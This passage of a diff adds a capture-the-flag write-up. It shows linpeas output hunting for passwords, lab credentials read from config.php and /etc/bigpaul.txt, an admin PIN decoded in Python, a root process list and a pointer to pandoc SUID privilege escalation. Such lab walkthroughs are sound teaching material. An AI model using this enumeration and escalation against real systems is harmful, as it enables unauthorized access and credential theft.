+/var/log/auth.log.1:Jan 27 16:46:59 matrixV99 sshd[2164]: Accepted password for root from 192.168.200.131 port 37992 ssh2
+/var/log/auth.log.1:Jan 27 16:48:30 matrixV99 sudo:     root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/service ntp restart
+/var/log/auth.log.1:Jan 27 16:48:35 matrixV99 sshd[1544]: Accepted password for root from 192.168.200.131 port 37996 ssh2
+/var/log/auth.log.1:Jan 27 16:54:32 matrixV99 sshd[1732]: Accepted password for root from 192.168.200.131 port 37998 ssh2
+/var/log/auth.log.1:Jan 27 16:58:08 matrixV99 chpasswd[1073]: pam_unix(chpasswd:chauthtok): password changed for architect
+/var/log/auth.log.1:Jan 27 16:58:08 matrixV99 sudo:     root : TTY=unknown ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/service ntp restart
+/var/log/auth.log.1:Jan 27 16:58:28 matrixV99 sshd[1526]: Accepted password for architect from 192.168.200.131 port 38000 ssh2
+/var/log/auth.log.1:Jan 27 16:59:00 matrixV99 chpasswd[1733]: pam_unix(chpasswd:chauthtok): password changed for architect
+/var/log/auth.log.1:Jan 27 16:59:09 matrixV99 sshd[1742]: Accepted password for architect from 192.168.200.131 port 38002 ssh2
+/var/log/auth.log.1:Jan 27 17:00:00 matrixV99 chpasswd[1891]: pam_unix(chpasswd:chauthtok): password changed for architect
+/var/log/auth.log.1:Jan 27 17:01:00 matrixV99 chpasswd[1954]: pam_unix(chpasswd:chauthtok): password changed for architect
+/var/log/auth.log.1:Jan 27 17:02:00 matrixV99 chpasswd[2017]: pam_unix(chpasswd:chauthtok): password changed for architect
+...
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/etc/amazon/ssm/README.md:docker run -it --rm --name ssm-agent-build-container -v `pwd`:/amazon-ssm-agent ssm-agent-build-image make build-release
+/etc/cloud/cloud.cfg:    lock_passwd: True
+/etc/cloud/cloud.cfg:    sudo: ["ALL=(ALL) NOPASSWD:ALL"]
+/etc/init.d/ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
+/etc/mysql/debian.cnf:password = 
+/etc/nsswitch.conf:passwd:         compat systemd
+/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
+/etc/rc2.d/S01ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
+/etc/rc3.d/S01ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
+/etc/rc4.d/S01ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
+/etc/rc5.d/S01ntp:UGID=$(getent passwd $RUNASUSER | cut -f 3,4 -d:) || true
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/ssl/openssl.cnf:challengePassword		= A challenge password
+/etc/ssl/openssl.cnf:challengePassword_max		= 20
+/etc/ssl/openssl.cnf:challengePassword_min		= 4
+/etc/sudoers.d/90-cloud-init-users:ubuntu ALL=(ALL) NOPASSWD:ALL
+/tmp/linpeas.sh.1:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed "s,.*,${C}[1;31;103m&${C}[0m,"
+/tmp/linpeas.sh.1:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
+/tmp/linpeas.sh.1:    for f in $tomcat; do grep "username=" "$f" 2>/dev/null | grep "password=" | sed "s,.*,${C}[1;31m&${C}[0m,"; done
+/tmp/linpeas.sh.1:PASSWORD=""
+/tmp/linpeas.sh.1:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
+/tmp/linpeas.sh.1:  PASSWORDTRY=$2
+/tmp/linpeas.sh.1:    P)  PASSWORD=$OPTARG;;
+/tmp/linpeas.sh.1:    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
+/tmp/linpeas.sh.1:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
+/var/www/html/admin/inc/class_form.php:		$input = "<input type=\"password\" name=\"".$name."\" value=\"".htmlspecialchars_uni($value)."\"";
+/var/www/html/admin/inc/class_form.php:	function generate_password_box($name, $value="", $options=array())
+/var/www/html/admin/inc/class_page.php:			<div class="field"><input type="password" name="password" id="password" class="text_input" /></div>
+/var/www/html/admin/index.php:		'password' => $mybb->input['password']
+/var/www/html/admin/modules/forum/management.php:		$forum_data['password'] = "";
+/var/www/html/admin/modules/forum/management.php:				"password" => $db->escape_string($mybb->input['password']),
+/var/www/html/admin/modules/user/users.php:			$updated_user['password'] = $mybb->input['new_password'];
+/var/www/html/admin/modules/user/users.php:			$updated_user['password2'] = $mybb->input['confirm_new_password'];
+/var/www/html/admin/modules/user/users.php:			"password" => $mybb->input['password'],
+/var/www/html/admin/modules/user/users.php:			"password2" => $mybb->input['confirm_password'],
+/var/www/html/archive/global.php:		$query = $db->simple_select("forums", "*", "fid='{$id}' AND active!=0 AND password=''");
+/var/www/html/archive/index.php:		$query = $db->simple_select("forums", "*", "active!=0 AND password=''", array('order_by' =>'pid, disporder'));
+/var/www/html/archive/index.php:			if(!$forum['fid'] || $forum['password'] !== '')
+/var/www/html/archive/index.php:		if(!$forum['fid'] || $forum['password'] !== '')
+/var/www/html/cache/themes/theme4/usercp.css:.usercp_nav_password:before{content:"\f084";}
+/var/www/html/forumdisplay.php:	if($foruminfo['password'] != '')
+/var/www/html/inc/config.php:$config['database']['password'] = 'prefixnulledcerv9';
+/var/www/html/inc/datahandlers/login.php:				$db->update_query("users", $password_fields, "uid = '{$this->login_data['uid']}'");
+/var/www/html/inc/datahandlers/login.php:				$password_fields = create_password($this->login_data['password']);
+/var/www/html/inc/datahandlers/login.php:	function verify_password($strict = true)
+/var/www/html/inc/datahandlers/user.php:		$password_fields = create_password($user['password'], false, $user);
+/var/www/html/inc/datahandlers/user.php:			$this->user_update_data['password'] = $user['password'];
+/var/www/html/inc/datahandlers/user.php:		if($mybb->settings['requirecomplexpasswords'] == 1)
+/var/www/html/inc/datahandlers/user.php:			if($user['email'] === $user['password'] || $user['username'] === $user['password']
+/var/www/html/inc/datahandlers/user.php:		if(isset($user['password2']) && $user['password'] !== $user['password2'])
+/var/www/html/inc/datahandlers/user.php:			"password" => $user['password'],
+/var/www/html/inc/db_pdo.php:	function __construct($dsn, $username="", $password="", $driver_options=array())
+/var/www/html/inc/db_pgsql.php:					$this->connect_string .= " password={$single_connection['password']}";
+/var/www/html/inc/functions_archive.php:function check_forum_password_archive($fid, $pid=0)
+/var/www/html/inc/functions_online.php:			elseif($parameters['action'] == "password" || $parameters['action'] == "do_password")
+/var/www/html/inc/functions.php:function check_forum_password($fid, $pid=0, $return=false)
+/var/www/html/inc/functions.php:function forum_password_validated($forum, $ignore_empty=false, $check_parents=false)
+/var/www/html/inc/functions.php:	if($forum_cache[$fid]['password'] !== '')
+/var/www/html/inc/functions.php:			if($forum_cache[$parent_id]['password'] !== "")
+/var/www/html/inc/functions.php:	return ($ignore_empty && $forum['password'] === '') || (
+/var/www/html/inc/functions_search.php:function get_password_protected_forums($fids=array())
+/var/www/html/inc/functions_user.php:	$db->update_query("users", $newpassword, "uid='$uid'");
+/var/www/html/inc/functions_user.php:		$db->update_query("users", $password_fields, "uid='".$user['uid']."'");
+/var/www/html/inc/functions_user.php:	$newpassword = array();
+/var/www/html/inc/functions_user.php:	$newpassword['loginkey'] = $loginkey;
+/var/www/html/inc/functions_user.php:	$newpassword['password'] = $saltedpw;
+/var/www/html/inc/functions_user.php:		$newpassword['salt'] = $salt;
+/var/www/html/inc/functions_user.php:		$password_fields = create_password($password, $user['salt'], $user);
+
+[+] Finding possible password variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+/root/SSH-TOTP-timeSimulator.py:    if(t_sshpass != currentpass):   
+/root/SSH-TOTP-timeSimulator.py:    sshpass = (sha256(repr(nOTP).encode('utf-8')).hexdigest())
+/root/SSH-TOTP-timeSimulator.py:    t_sshpass = sshpass[22:44]
+/var/www/html/inc/3rdparty/2fa/GoogleAuthenticator.php:        $secretkey = $this->_base32Decode($secret);
+/var/www/html/inc/languages/english/admin/user_users.lang.php:$l['recieve_admin_emails'] = "Receive emails from administrators";
+/var/www/html/install/resources/language.lang.php:$l['database_host'] = "Database Server Hostname:";
+/var/www/html/install/resources/language.lang.php:$l['database_name'] = "Database Name:";
+/var/www/html/install/resources/language.lang.php:$l['database_user'] = "Database Username:";
+```
+
+
+
+<br>
+<p>/etc/</p>
+
+```bash
+root@...:/etc# cat bigpaul.txt
+web login:
+bigpaul = ilovemywifeandgirlfriend022366
+ACP Pin = 101754⊕23435+689511
+```
+
+```bash
+:~/M4tr1xExitDenied# python3
+Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
+[GCC 9.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print((101754 ^123435) + 689511)
+718008
+```
+
+<img width="1118" height="166" alt="image" src="https://github.com/user-attachments/assets/2cd72c52-65d6-444a-aa2c-830c38693ac0" />
+
+<br>
+<br>
+<br>
+
+```bash
+root@...:/etc# ps aux | grep root
+...
+root         635  0.0  0.3 236064  7852 ?        Ssl  20:13   0:00 /usr/lib/accountsservice/accounts-daemon
+root         636  0.0  1.1 793300 23144 ?        Ssl  20:13   0:00 /usr/bin/amazon-ssm-agent
+root         643  0.0  0.1  81832  3564 ?        Ssl  20:13   0:00 /usr/sbin/irqbalance --foreground
+root         645  0.0  0.9  29924 18760 ?        Ss   20:13   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
+root         662  0.0  0.1   7072  3172 ?        Ss   20:13   0:00 /usr/sbin/cron -f
+root         663  0.0  0.3 232988  7128 ?        Ssl  20:13   0:00 /usr/lib/policykit-1/polkitd --no-debug
+root         667  0.0  0.4  19892  7920 ?        Ss   20:13   0:00 /lib/systemd/systemd-logind
+root         671  0.0  0.6 395764 12216 ?        Ssl  20:13   0:00 /usr/lib/udisks2/udisksd
+root         675  0.0  0.1   8628  3348 ?        S    20:13   0:00 /usr/sbin/CRON -f
+root         699  0.0  0.0   2616   532 ?        Ss   20:13   0:00 /bin/sh -c sudo python3 /root/SSH-TOTP-timeSimulator.py
+root         701  0.0  0.2   9552  4744 ?        S    20:13   0:00 sudo python3 /root/SSH-TOTP-timeSimulator.py
+root         729  0.0  0.1   5828  2436 ttyS0    Ss+  20:13   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
+root         734  0.0  0.1   6056  2016 tty1     Ss+  20:13   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+root         746  0.1  0.6  21516 12156 ?        S    20:13   0:04 python3 /root/SSH-TOTP-timeSimulator.py
+root         783  0.0  1.0 108412 20964 ?        Ssl  20:13   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
+root         784  0.0  0.3  14348  7444 ?        Ss   20:13   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+root         785  0.0  0.5 241404 11312 ?        Ssl  20:13   0:00 /usr/sbin/ModemManager
+root         885  0.0  1.8 242396 36324 ?        Ss   20:13   0:00 /usr/sbin/apache2 -k start
+root         971  0.0  1.8 808384 36296 ?        Sl   20:13   0:00 /usr/bin/ssm-agent-worker
+root        1112  1.7  5.4 2281064 108140 ?      Ssl  20:13   0:54 /etc/badr/badr --config /etc/badr/rules.yaml --config /etc/badr/room.config.yaml > /var/log/badr.log 2>&1
+root        1692  0.0  0.0      0     0 ?        I    20:18   0:00 [kworker/0:0-events]
+```
+
+
+
+<br>
+<img width="1140" height="199" alt="image" src="https://github.com/user-attachments/assets/cc69f2ef-ca8b-40c5-bba5-cbe8234eeedf" />
+
+<br>
+<br>
+<br>
+
+<img width="1147" height="227" alt="image" src="https://github.com/user-attachments/assets/000bdd55-e367-4395-ba04-3b866227ba5f" />
+
+<br>
+<br>
+<br>
+
+<p>GTFObins Pandoc:https://gtfobins.github.io/gtfobins/pandoc/#suid</p>
+
+<img width="1102" height="310" alt="image" src="https://github.com/user-attachments/assets/a1455292-5cc3-43cb-b3e6-6ecd466fe85d" />
+
+<br>
+<br>
+<br>
+
+
+
 
 
 <br>
